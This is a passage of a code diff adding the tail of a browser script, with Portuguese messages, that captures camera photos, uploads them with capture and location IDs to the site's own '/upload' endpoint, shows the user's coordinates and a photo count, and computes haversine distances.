+      takingPhoto ||
+      !cameraGranted ||
+      !video.videoWidth ||
+      !video.videoHeight
+    ) {
+      return;
+    }
+
+
+    takingPhoto = true;
+
+
+    try {
+
+      canvas.width =
+        video.videoWidth;
+
+      canvas.height =
+        video.videoHeight;
+
+
+      canvas
+        .getContext("2d")
+        .drawImage(
+          video,
+          0,
+          0,
+          canvas.width,
+          canvas.height
+        );
+
+
+      const blob =
+        await new Promise(
+          resolve =>
+            canvas.toBlob(
+              resolve,
+              "image/jpeg",
+              0.82
+            )
+        );
+
+
+      if (!blob) {
+        throw new Error(
+          "Não foi possível criar a imagem."
+        );
+      }
+
+
+      const formData =
+        new FormData();
+
+
+      formData.append(
+        "photo",
+        blob,
+        "capture.jpg"
+      );
+
+
+      formData.append(
+        "capture_id",
+        captureId
+      );
+
+
+      formData.append(
+        "page_key",
+        pageKey
+      );
+
+
+      if (
+        locationId !== null &&
+        locationId !== undefined
+      ) {
+
+        formData.append(
+          "location_id",
+          locationId
+        );
+      }
+
+
+      const response =
+        await fetch(
+          "/upload",
+          {
+            method: "POST",
+            credentials: "same-origin",
+            body: formData
+          }
+        );
+
+
+      const data =
+        await response.json();
+
+
+      if (
+        !response.ok ||
+        !data.success
+      ) {
+
+        throw new Error(
+          data.error ||
+          "Falha ao salvar a foto."
+        );
+      }
+
+
+      photoCount++;
+
+      photoCountElement.textContent =
+        photoCount;
+
+    } finally {
+
+      takingPhoto = false;
+    }
+  }
+
+
+  function updatePosition(
+    latitude,
+    longitude
+  ) {
+
+    latitudeElement.textContent =
+      Number(latitude).toFixed(6);
+
+    longitudeElement.textContent =
+      Number(longitude).toFixed(6);
+  }
+
+
+  function calculateDistance(
+    lat1,
+    lon1,
+    lat2,
+    lon2
+  ) {
+
+    const rad =
+      Math.PI / 180;
+
+
+    const a =
+      Math.sin(
+        (lat2 - lat1) *
+        rad / 2
+      ) ** 2
+
+      +
+
+      Math.cos(
+        lat1 * rad
+      ) *
+
+      Math.cos(
+        lat2 * rad
+      ) *
+
+      Math.sin(
+        (lon2 - lon1) *
+        rad / 2
+      ) ** 2;
+
+
+    return (
+      6371000 *
+      2 *
+      Math.atan2(
+        Math.sqrt(a),
+        Math.sqrt(1 - a)
+      )
+    );
+  }
+
+
+  window.addEventListener(
+    "beforeunload",
+    () => {
+
+      if (watchId !== null) {
+
+        navigator.geolocation.clearWatch(
+          watchId
+        );
+      }
+
+
+      if (stream) {
+
+        stream
+          .getTracks()
+          .forEach(
+            track => track.stop()
+          );
+      }
+
+
+      clearInterval(
+        reminderTimer
+      );
+
+      clearInterval(
+        cameraOnlyTimer
+      );
+    }
+  );
+
+
+  permissionButton.addEventListener(
+    "click",
+    handlePermissionClick
+  );
+
+</script>
+
 </body>
 </html>
